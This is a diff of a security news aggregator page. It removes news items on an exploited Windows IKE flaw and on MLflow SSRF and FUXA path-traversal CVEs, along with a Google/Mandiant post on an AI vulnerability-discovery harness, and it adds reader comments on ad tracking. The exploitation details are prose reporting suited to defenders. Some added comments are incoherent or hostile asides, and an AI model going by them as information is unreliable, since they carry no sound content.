             <div class="content-text">Security teams are overwhelmed with findings but still struggle to answer a simple question: which risks matter right now? A vulnerability alone is rarely the problem. The same vulnerability running in production, exposed through a misconfiguration or over-permissioned identity, is a real path to compromise. Organizations do not need longer lists of alerts. They need context that connects code, cloud resources, identities, and runtime activity so they can prioritize the issues that pose the greatest risk and stop cyberthreats before they reach production.
@@ -163,145 +445,13 @@ To learn more about Microsoft Security solutions, visit our [website.](https://w
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">AWSHound: An OpenSource AWS OpenGraph Collector</h2>
             <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/08/19/awshound-opensource-aws-opengraph-collector/" target="_blank">Original Link</a></p>
             <div class="content-text"><p>Daniel Heinsen and I have spent a lot of my time trying to answer one question inside AWS environments, usually in a hurry: “Starting from the access I have right now, where can I actually end up?” That turns out to be a hard question to answer in AWS. iam:SimulatePrincipalPolicy will evaluate one action, against [&#8230;]</p>
 <p>The post <a href="https://specterops.io/blog/2026/08/19/awshound-opensource-aws-opengraph-collector/">AWSHound: An OpenSource AWS OpenGraph Collector</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
 
 [Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">Critical RCE flaw in Windows IKE Extension now actively exploited</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-critical-windows-ike-extension-flaw-now-exploited-in-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned that hackers are exploiting a critical-severity remote code execution (RCE) flaw in the Windows Internet Key Exchange (IKE) Service Extensions component. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">Attackers Exploit MLflow SSRF Flaw to Steal Cloud Credentials and Secrets</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/08/attackers-exploit-mlflow-ssrf-flaw-to.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Two critical vulnerabilities impacting MLflow, an open-source artificial intelligence (AI) platform, and FUXA, an open-source, web-based SCADA / HMI software built for operational technology (OT) and industrial automation, are witnessing malicious scanning and exploitation efforts.
-According to independent reports from watchTowr and VulnCheck, the vulnerabilities in question are as follows -
-[CVE-2026-64849](https://github.com/mlflow/mlflow/security/advisories/GHSA-7gwp-5pfp-969j)(CVSS score: 9.3) - An unauthenticated Server-Side Request Forgery (SSRF) vulnerability in MLflow that can allow an attacker who can reach the Tracking Server (mlflow server) to issue HTTP requests to arbitrary internal cloud metadata endpoints and extract sensitive data. (Affects versions < 3.15.0)[CVE-2026-25895](https://github.com/frangoteam/FUXA/security/advisories/GHSA-88qh-cphv-996c)(CVSS score: 9.5) - A missing authentication for a critical function and path traversal vulnerability in FUXA that can allow an unauthenticated, remote attacker to write arbitrary files to the server file system and achieve remote code execution. (Affects versions <= 1.2.9)
-"Attackers are exploiting [CVE-2026-64849] to reach cloud metadata services directly, and exfiltrating cloud credentials and secrets," watchTowr [said](https://www.linkedin.com/posts/watchtowr_watchtowr-intel-is-observing-in-the-wild-activity-7495481580723838976-qzUA/) in a post on LinkedIn, adding it detected bad actors indiscriminately scanning for exposed MLflow instances online within hours of the CVE being assigned on August 17, 2026.
-"It allows an attacker to exploit a flaw in MLflow's model-registry webhooks to proxy requests through the affected system and interact with internal services," Yordan Ganchev, principal threat intelligence specialist at watchTowr, said in a statement shared with The Hacker News.
-"The security bug bypasses prior fixes because of how it handles web redirects. Evidence from our global honeypot telemetry indicates attackers are abusing this vulnerability to target cloud-hosted MLflow systems in an attempt to extract credentials and secrets from well-known internal IP addresses and services."
-Organizations running MLflow are recommended to prioritize patching affected, exposed systems, review audit logs for signs of compromise, and check whether sensitive credentials have been exposed.
-As for CVE-2026-25895, VulnCheck said it detected malicious scanning aimed at the flaw starting August 18, 2026. A single IP address has been observed broadly scanning the internet for vulnerable FUXA instances. There are about 60 FUXA installations exposed to the public internet.
-"The attacker request attempts to overwrite main.js with junk data via the CVE-2026-25895 path traversal," Caitlin Condon, vice president of research at VulnCheck, [said](https://www.linkedin.com/posts/ccondon_kev-vulnerability-rce-share-7495432850213670913-KseT) in a LinkedIn post. "No RCE payloads dropped yet."
-Over the past year, two other vulnerabilities in FUXA – [CVE-2026-25939](https://nvd.nist.gov/vuln/detail/CVE-2026-25939) and [CVE-2023-33831](https://nvd.nist.gov/vuln/detail/CVE-2023-33831) – have also witnessed active exploitation efforts, with the latter witnessing activity "dating back to November 2025 and as recently as yesterday," per Condon.
-Update
-The U.S. Cybersecurity and Infrastructure Security Agency (CISA), on August 19, 2026, [added](https://www.cisa.gov/news-events/alerts/2026/08/19/cisa-adds-one-known-exploited-vulnerability-catalog) CVE-2026-64849 to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, requiring Federal Civilian Executive Branch (FCEB) agencies to apply the patches by September 2, 2026.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Staying Ahead of Adversarial AI Through Agentic Source Code Review</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/staying-ahead-of-adversarial-ai-through-agentic-source-code-review/" target="_blank">Original Link</a></p>
-            <div class="content-text">Staying Ahead of Adversarial AI Through Agentic Source Code Review
-Google Threat Intelligence Group
-Google Threat Intelligence
-Visibility and context on the threats that matter most.
-[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
-Introduction
-Adversarial misuse of AI has increased the risk of data theft and extortion events, because when proprietary source code is exposed, defenders must scramble to identify and patch vulnerabilities while attackers deploy machine-speed AI tools against them.
-By structuring the analysis process, enforcing skeptical validation steps, and injecting domain-specific human expertise directly into the pipeline, we’ve achieved a leap in efficacy. Combining AI models with a deeply structured, human expert-driven orchestration layer to tip the scales so that defenders can beat adversaries to the punch.
-Today, we use the Agentic Vulnerability Discovery Harness (AVDH) to rapidly analyze code and find exploit paths during proactive reviews, penetration tests, red team operations, and incident response engagements. By combining multi-agent orchestration with our frontline subject-matter expertise, this framework helps to augment the discovery and validation of routine vulnerabilities, enabling humans to focus their impact.
-To help defenders implement similar approaches for their own environments, we are sharing the details of this internal, point-in-time architecture for the first time. AVDH can also be used alongside CodeMender’s ongoing scanning to create a two-layered defense strategy.
-Real-World Results
-In the 10 months that we’ve been using AVDH, we’ve seen it have a significant impact. During a recent incident response investigation involving stolen corporate repositories, the harness discovered over 100 true-positive critical vulnerabilities in just two days — achieving results in a fraction of the time required for manual review.
-This has greatly accelerated how Mandiant discovers vulnerabilities at scale. We have used it to analyze environments spanning tens of millions of lines of code, and execute thousands of pipelines to generate tens of thousands of findings. This rapid analysis has uncovered dozens of assignable flaws in widely used web extensions and open-source projects, resulting in 12 assigned CVEs, including [CVE-2026-13242](https://www.drupal.org/sa-contrib-2026-062), [CVE-2026-55803](https://www.drupal.org/sa-core-2026-005), and an additional dozen currently in active disclosure.
-While fast, broad, high-precision scanning has been one of the key benefits of AVDH, it has also acted as a force multiplier during our targeted adversary simulation engagements. We recently processed a client’s web application source code through the harness, and quickly found a remote code execution (RCE) vulnerability that enabled initial access.
-AVDH has repeatedly proven invaluable for navigating mature defenses and accelerating complex exploit chains.
-Architecting the Pipeline
-Harnesses have become a vital tool for cybersecurity uses of large language models (LLMs). They help mitigate much of the model’s unpredictability, driven by inherent, non-deterministic behavior, and dramatically improve their effectiveness at code analysis.
-The programmatic infrastructure of a harness orchestrates agents in a strictly deterministic manner toward objective completion. For AVDH, we used the [Google Agent Development Kit](https://adk.dev/) (ADK), an LLM framework that implements the most common agent orchestration patterns, and provides flexibility for configuring custom and third-party integrations. This approach aligns with the agentic orchestration capabilities now available in [Google Antigravity](https://antigravity.google/), which provides a centralized workspace for builders to steer and manage these agentic workflows.
-Our decades of frontline experience discovering and remediating vulnerabilities across every software domain helped us structure AVDH around the proven methodologies our consultants execute daily. AVDH chains specialized agents together in a sequential pipeline, much like the waterfall approach to software development: each phase is completed before the next begins. This pipeline yields a prioritized, risk-rated list of findings, primed for a human expert to review.
-Just as frontline security experts rely on organizational context, an agentic harness requires rich environmental inputs — such as asset inventories, software bills of materials (SBOMs), architecture documentation, and threat intelligence. When fed into a distilled human knowledge base, this contextual data allows agents to dynamically select relevant skills, language rules, and vulnerability patterns for deep analysis.
-Figure 1: Sequential vulnerability discovery methodology
-Threat Modeling
-A critical first step when using AI for code security analysis is to establish a threat model for the target codebase. Software architectures can vary wildly, and without a threat model, we can lose valuable context, such as attack vectors, business logic, and reachability.
-While traditional source code review engines rely on rigid pattern-matching rules, an LLM offers the distinct advantage of distinguishing code accessible to a standard user from code restricted to an administrator, or code that is never executed at all.
-Our pipeline begins by dispatching an Explorer agent to identify the core purpose of the target codebase. This agent determines the software domain (such as web or desktop application), reviews discovered documentation, flags directories to exclude from scanning (such as those containing unit tests), and dispatches Specialist Explorer subagents.
-These Specialist Explorers then delve into their respective focus areas, including authentication, authorization, routing, and other domain-specific categories. Their output is passed to a Threat Model Synthesis agent, which aggregates the findings into a cohesive threat model.
-Figure 2: Codebase reconnaissance workflow diagram
-Once this stage of analysis is complete, the consultant is presented with both textual and visual representations of the threat model for verification before analysis continues. This approval gate helps ensure that the rest of the pipeline has an accurate foundation to operate on.
-Figure 3 shows an example layout of a visual threat model generated by the harness, indicating which application components are exposed and how they connect.
-Figure 3: Visual representation of a threat model for a sample codebase
-Entry Point Discovery
-With the threat model established, we deploy parallelized Discovery agents to analyze every in-scope file. These agents use the lightweight Gemini Flash Lite model to process code at scale to extract critical application entry points, such as HTTP routes, inter-process communication (IPC) listeners, and other domain-specific attack vectors. Simultaneously, they isolate and extract all identifiable sources of user input nested in these identified entry points.
-Figure 4: Entry point discovery workflow diagram
-Context Enrichment
-Once entry points are selected for analysis, the harness assigns each to a dedicated Enrichment agent. In enterprise applications, analyzing an entry point in isolation is rarely sufficient — critical components like sanitizers, permissions, and routing conditions are often highly distributed.
-Furthermore, vulnerabilities frequently hide deep within nested function calls, multiple hops and files away from the initial source. To bridge this gap, the Enrichment agent navigates the codebase to aggregate contextually relevant code for its assigned entry point. It evaluates this aggregated data to determine whether the entry point requires further analysis by the Access Control agent, the Data Flow Analysis agent, or both.
-Figure 5: Context enrichment workflow diagram
-Hypothesis Generation
-Effective code analysis hinges on observing two primary properties: control flow and data flow. While control flow dictates the execution order of tasks and instructions, data flow traces how information moves and transforms throughout the application.
-Our AVDH delegates these critical tasks to the Access Control and Data Flow Analysis agents, respectively.
-At this stage, these agents perform minimal self-validation. Their primary objective is expansive brainstorming. To manage the sheer volume of hypotheses produced, this creative process is kept in check by a Confidence Filter configured by the consultant.
-Figure 6: Hypothesis generation gating diagram
-The Access Control agent evaluates the protections surrounding the target entry point to determine its overall accessibility to application users. Its primary purpose is to validate security assumptions, and confirm whether privileged functionality is restricted or inadvertently exposed to unauthorized users. This analysis exposes flaws where a check was never made, or made against the wrong identity, including missing authorization, privilege escalation, and cross-site request forgery (CSRF).
-Meanwhile, the Data Flow Analysis agent tracks the flow of user input from the initial entry point throughout the entire application. It traces data as it traverses nested function calls, sanitizer transformations, and storage boundaries like databases.
-The agent's goal is to determine if this user-supplied data ever reaches a dangerous "sink," a function where malicious input could execute and cause harm. This deep tracing unearths vulnerability classes such as SQL injection, cross-site scripting (XSS), command injection, and path traversal.
-Hypothesis Validation
-Once hypotheses are generated for the target codebase, our harness dispatches a new set of agents to validate them. In LLMs, the temperature parameter dictates the variability and randomness of the output: lower temperatures yield predictable, stable responses, while higher values can produce radically different results each time.
-Our harness uses this by dispatching multiple Validation agents configured with high temperature settings to assess each hypothesis, alongside a single Validation Synthesis agent tasked with processing their verdicts to make a final decision. Using a higher temperature enables our validation to cover a much broader spectrum of possibilities rather than more predictable, expected responses. Ultimately, this temperature configuration provides richer, more comprehensive context for the agent making the final determination.
-The Synthesis agent evaluates the reasoning and verdicts from the Validation agents to determine if the hypothesis meets our rigorous quality criteria and aligns with the overall threat model. From here, there are three possible outcomes:
--
-Confirmed finding: The hypothesis is robust, and the Validation agents have independently verified it.
--
-Disproven hypothesis: The Validation agents surface significant conflicting evidence disputing the validity of the flaw.
--
-Rejected hypothesis: The hypothesis does not align with the established threat model, or does not qualify as a vulnerability.
-Figure 7: Hypothesis validation workflow diagram
-Human Subject-Matter Expertise
-Expert Validation
-Once the harness deduplicates and risk-rates the confirmed findings, we continue the analysis with rigorous human expert review. We perform due diligence by dynamically replicating the exploitation and executing Proof-of-Concept (POC) code to verify that the AI assumptions are accurate and that no unseen compensating controls hinder the attack path.
-Once validated, the consultant synthesizes the AI-generated finding with their own expert analysis and prepares it for formal disclosure. Conversely, any findings that fail to pass this dynamic testing phase are discarded.
-We encourage network defenders considering implementing similar vulnerability discovery harnesses to manually validate findings.
-Figure 8: Human-in-the-loop handover diagram
-Distilled Knowledge
-While human-in-the-loop validation of confirmed findings effectively minimizes false positives, we still need to address false negatives.
-To determine if the AI agents had missed any vulnerabilities, we engineered a rules-based approach that directly injects Mandiant subject-matter expertise into the analysis pipeline. It uses highly-specialized prompts distilled from our consultants' collective knowledge, similar to the skills engineering concept.
-Integrating this human intelligence directly into our AI-driven analysis significantly elevates the precision of the results. To ensure this knowledge system remains modular and scalable, we structured it as a hierarchy with the software domain at the top, followed by three primary rule categories: language, framework, and vulnerability.
-Figure 9: Agentic rule system hierarchy
-Framework and language rules apply across the entire pipeline, equipping the agents with consultant insights into the specific technologies employed within the target codebase. These rules encompass critical details, such as common entry point definition patterns and unique attack surfaces, with additional contextual information essential for threat modeling.
-In contrast, vulnerability rules apply exclusively during the final stages of the pipeline, prescribing precisely how to discover, validate, and risk-rate specific types of vulnerabilities. This structured system ensures the entire analysis pipeline is infused with Mandiant’s human expertise in a maintainable, highly modular way.
-Figure 10: Methodology rule application diagram
-Measuring Success
-Accurate benchmarking and evaluation are critical to maintaining and continuously improving an agentic code analysis pipeline. We developed a rigorous internal methodology for measuring the performance of our orchestration harness, ensuring that prompt adjustments and rule updates consistently drive positive, data-backed improvements without introducing quality regressions.
-We recommend implementing an analogous benchmarking system to gauge progress and efficacy with your code analysis pipeline.
-Benchmark Targets
-While public code vulnerability datasets exist, training data contamination presents a significant challenge for evaluating LLMs. It is possible that modern frontier models have already ingested these public repositories, making it nearly impossible to determine if a model is genuinely reasoning through a vulnerability or simply recalling a memorized solution.
-To ensure high-fidelity evaluation, we developed a suite of proprietary, synthetic codebases. These custom benchmarks span software domains, programming languages, vulnerability depths, and architectures, from traditional monoliths to modern microservices.
-Crucially, our security consultants manually verify every injected vulnerability to ensure it is genuinely reachable and dynamically exploitable. As we tune the harness and its underlying prompts, we enforce strict review processes to actively prevent the AI from overfitting to these benchmark codebases.
-Benchmark Grading
-Our grading process pairs AI evaluation with expert human-in-the-loop review. When our harness analyzes a benchmark directory, the output is passed to a dedicated Grading agent. This grader evaluates the pipeline's findings against our ground-truth dataset, demanding precise vulnerability matches rather than relying on loose semantic similarity.
-From there, the grading pipeline branches out to handle edge cases:
--
-False positive triage: Harness findings that do not map to the ground truth are routed to a secondary agent to definitively classify them as either false positives or legitimate vulnerabilities.
--
-Duplicate resolution: If the pipeline produces multiple findings that map to a single ground-truth issue, another agent analyzes the cluster to determine whether the findings are duplicates.
-Finally, a human expert manually reviews the graded data to validate the accuracy of the AI judges. We perform this rigorous testing cycle across multiple domains and architectures for every major release of the harness, averaging out the results to account for the inherent non-determinism of LLMs.
-Framework and language rules apply across the entire pipeline, equipping the agents with consultant insights into the specific technologies employed within the target codebase. These rules encompass critical details, such as common entry point definition patterns and unique attack surfaces, with additional contextual information essential for threat modeling.
-In contrast, vulnerability rules apply exclusively during the final stages of the pipeline, prescribing precisely how to discover, validate, and risk-rate specific types of vulnerabilities. This structured system ensures the entire analysis pipeline is infused with Mandiant’s human expertise in a maintainable, highly modular way.
-Figure 11: Benchmarking process diagram
-Conclusion
-Securing the software development pipeline has emerged as a defining challenge in modern enterprise defense. Our ongoing research has shown that defenders face extraordinary challenges in [responding to the rapidly-growing capabilities of adversarial AI](https://cloud.google.com/blog/topics/threat-intelligence/defending-enterprise-ai-vulnerabilities).
-To match these emerging threats, securing the code pipeline must be a critical component of a modern defense strategy. Manual source code review can’t keep pace with AI, and traditional scanning engines consistently miss the broad spectrum of vulnerabilities hidden in modern software.
-However, the success of our harness proves defenders can reclaim the advantage against adversarial AI. By embedding frontier models within an expert-defined harness, defenders can automate the discovery of routine vulnerabilities.
-Handling these standard findings transforms source code visibility into a scalable defense, freeing our consultants and other defenders to focus entirely on complex flaws. We believe that the process of building and refining this harness has demonstrated that AI is most effective when deployed as a practical multiplier for human expertise.
-While our tool was built for point-in-time assessments and deep, proactive vulnerability discovery, [our recent blog post ](https://cloud.google.com/blog/topics/threat-intelligence/ai-assisted-vulnerability-management)describes how CodeMender complements this by providing continuous, AI-enabled monitoring for software development and vulnerability management. For organizations looking to deploy these capabilities out-of-the-box, [Google AI Threat Defense](https://cloud.google.com/security/ai-threat-defense?e=48754805) offers an always-on platform. It includes CodeMender’s code scanning and remediation to analyze systems, prioritize threats, patch vulnerabilities, and continuously monitor for new attacks. Combining AVDH for targeted, deep analysis with CodeMender’s ongoing scanning creates a two-layered defense strategy. This approach leverages point-in-time remediation for complex chains while maintaining continuous visibility over the development lifecycle.
-Want a deeper look at how we built and deploy this pipeline in real-world environments? Join us at [Cyber Defense Summit](https://cyberdefensesummit.mandiant.com/) September 15-16, 2026 in Washington, D.C. where we will be presenting "[How Mandiant Orchestrates Gemini to Find Zero-Days Before Adversaries.](https://cyberdefensesummit.mandiant.com/conf2026/session/4345117/how-mandiant-orchestrates-gemini-to-find-zero-days-before-adversaries)" We will walk through live demonstrations, share lessons learned from deploying agentic workflows, and discuss the future of AI-driven offensive and defensive capabilities. [Register for the Summit here](https://cyberdefensesummit.mandiant.com/conf2026/begin).</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
@@ -419,6 +569,7 @@ I’ve tried switching my default browser to a privacy-aware browser like DuckDu
 Any thoughts? I’ve been slipping my gears on this issue for several months.
 just use firefox
 Am not a big mobile user for accessing the internet. It’s and age and eyes thing, so I stick to computers 99% of the time. I just bit the bullet years ago and use Firefox and uBlock Origin, and the Electronic Freedom Foundations’ fantastic Privacy Badger add-on, and NoScript which has been on every browser I’ve used since day one. I only use Safari for accessing the apple site directly, since it handles the forums there better than anything else. No Chrome since it’s keystoneupdate agent eats CPU cycles mercilessly and of course the whole manifest v3 rollout making the ad-blockers not as adaptable. Firefox only. Outside of that, I seldom encounter ads, and with uBO, I can whitelist sites that crab about having an ad-blocker.. Which is interesting, as when I DO whitelist sites, the ads still do not show so one of the other add-ons is stepping up in the background to maintain the restrictions on the ads? Hmm. I do also use Dan Pollocks’ Hosts file (which can be found at someonewhocares-dot-org/ hosts/ – I’ve used it for over 2 decades – started with my beigh G3 PowerMac running MacOS 8.6 and it’s been faithfully updated weekly -seriously, Dan’s an absolute God…) so maybe that is why I seldom get ads even on whitelisted sites.
+I haven’t gone near EFF since autumn 2012. Evil people. Worse even than FISA in a way.
 Excellent Article!!! Thank you
 @Some guy on the Internet
 You are correct to be careful with extensions, after all even a legitimate one could eventually be compromised, and depending on your browser and the permissions you grant the extensions, this could lead to full page content being exposed for everything you browse, including credential cookies.
@@ -431,6 +582,7 @@ I love that phrase “AI slop”!
 How about using a stand alone password manager? I use Bitwarden and there are others as well.
 As this article illustrates, Decrypt’s web pages are annoyingly formatted as white on black, which is very difficult to read. If Decrypt wants its pages to be more easy to red, change them to the normal black on white.
 Hey Jay. If you register a free account, you can change the default to light mode.
+Should we really care about how and data scraping site has “themes”?
 As Brian Krebs himself mentioned, we have a light mode available! Just go to your Account dropdown in the top-right, go to Appearance, and you can swap between Dark / Light.
 If anyone else has questions/feedback, happy to help!
 One suggestion: always use incognito mode in your web browser. Unless a site is doing fingerprinting, it should help avoid long term spying on you. And, some browsers have defenses against fingerprinting.
@@ -438,6 +590,7 @@ The suggestion to use two browsers is excellent. Have one with no extensions, ot
 I don’t think incognito mode actually does quite what you think it does.
 I think it is totally fair to assume a strange looking shadowed figure is following you around wearing either a masquerade mask, opera glasses, or some form of sunglasses resembling the Nazi officer’s in Raiders of the Lost Ark (but updated to at least a half century later, and with the man’s self tinted a dark grey). This figure then physically locates the bits and bytes in question, whisks them away to a safe place, modifies the date to one in a different dimension, unique only to you, then returns the results, scrubbed of all identifying marks, to your extra dimensional browser. It is further incognitoed by the fact that anyone witnessing you viewing the results will see neither hide nor hair of the actual results without the special invisible decoder ring that only your specifical browser’s session cookies bestows.
 Fingerprinting is a lot more than whether your search history/cache is turned on. It involved your networking fingerprint (TLS Hello) which is unique to your browser and it’s configuration (doesn’t change with/without incognito), your IP address, geolocation, the advertising IDs associated with your IP address, time of day, and so many other things. All incognito does it makes it to where the advertisers have to look up your advertising ID rather than you sending it attached to the web request (super trivial)
+We all like to make every real life event a scene here in the world of Macromedia Director in the 90s. Not sure that would be worth much either almost thirty years after becoming heirless.
 I read this looking for a reference to email spam as I assume this is part of the same effort by these ad groups, but I didn’t see any. I’m curious why.
 For context I ask because I receive several dozen email spam daily, of which a good portion are phishing (your photo storage will be deleted etc.) and others are the usual medical “trick” garbage. However the most puzzling aspect is that 95% of all spam are sent from Microsoft Outlook or an Amazon hosted domain. Neither Microsoft nor Amazon do anything about the hundreds of abuse reports they have been sent. Why?
 Using DNS to avoid ads/trackers is very useful. However, DNS is complicated and modifying your router, either with Pi-Hole, or NextDNS or any DNS service that offers blocking of ads/trackers/malware is far from the whole story. The DNS configuration can also be set by your Operating System, your browser, or a VPN. Which one over-rides the others? There are assorted testers of your live DNS configuration here
@@ -465,7 +618,12 @@ It does say straight up that some features are only for enterprise/researchers a
 I don’t think “having an account” does anything except allow you to use the service, hence deleting it is not real necessary, assuming they’re not going to bombard you with spam – which given the nature of their service would be pretty ironic.
 I recently upped my add blocking to include running my phone through tailscale to use my home server as an exit node, making my phone use the home technitium DNS (fancy man’s pihole) and it’s really nice. Getting DNS ad blocking for all my mobile browsing and apps is very pleasing.
 I’m not suggesting that as a solution for everyone, but it is very nice
-Tried to register several times with my proton account, nothing ever received.</div>
+Tried to register several times with my proton account, nothing ever received.
+Most places poopoo on protonmail. I have attempted to use protonmail, tutanota, and a couple of other email services for things in the past and not only never got email verifications but got locked out of email addresses for some places that feel merely the idea of a non-top-five email provider was criminal; not sure how they pull that off, but it is no fun. Be warned. note, I am not a Nixon fan (especially the one who ran for Office in 2018), but that doesn’t make me also not a crook; I am pretty damn clean.
+One additional use for this kind of mapping is evidence preservation. Files such as ads.txt and sellers.json are mutable, so a present-day lookup may not show the supply path that existed when a malicious ad or unexpected data transfer occurred. A useful workflow would save timestamped copies of the relevant declarations, record redirects and ownership identifiers, and compare changes over time. That would help distinguish a partner that was never authorized from one that was listed briefly and later removed. It could also make incident reviews more reproducible for publishers, exchanges, and researchers without treating every current declaration as proof of past behavior.
+In the land of dead ptah’s every dead bird we killed urself is speech taking day for the innocent
+Hey SIM nearest you, turn.
+Great antennas. Almost as good as due process and lawyers.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
